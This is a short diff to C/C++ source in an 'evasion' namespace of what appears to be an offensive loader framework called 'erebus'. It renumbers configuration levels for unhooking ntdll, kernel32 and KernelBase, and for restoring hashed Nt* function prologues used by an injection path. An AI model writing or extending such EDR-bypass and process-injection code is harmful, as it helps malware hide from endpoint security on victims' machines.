@@ -149,19 +149,18 @@ namespace evasion {
         // a chance through whatever hook may remain.
         // -----------------------------------------------------------------
 
-        // CONFIG_UNHOOK_SCOPE 0: ntdll only (always runs when scope >= 0,
-        // which is every valid value).
-#if CONFIG_UNHOOK_SCOPE >= 0
+        // CONFIG_UNHOOK_SCOPE 0 = None  – skip all unhooking.
+        // CONFIG_UNHOOK_SCOPE 1 = ntdll only.
+        // CONFIG_UNHOOK_SCOPE 2 = ntdll + kernel32 + KernelBase.
+        // CONFIG_UNHOOK_SCOPE 3 = selective (per-function prologue restore).
+#if CONFIG_UNHOOK_SCOPE >= 1
         UnhookNtdll();
 #endif
-        // CONFIG_UNHOOK_SCOPE 1: also unhook kernel32 and KernelBase.
-#if CONFIG_UNHOOK_SCOPE >= 1
+#if CONFIG_UNHOOK_SCOPE >= 2
         UnhookKernel32();
         UnhookKernelbase();
 #endif
-        // CONFIG_UNHOOK_SCOPE 2: selective per-function prologue restore.
-        // Default list covers the Nt* functions used by the injection path.
-#if CONFIG_UNHOOK_SCOPE == 2
+#if CONFIG_UNHOOK_SCOPE == 3
         static const ULONG kSelectiveHashes[] = {
             erebus::HashStringFowlerNollVoVariant1a("NtAllocateVirtualMemory"),
             erebus::HashStringFowlerNollVoVariant1a("NtWriteVirtualMemory"),
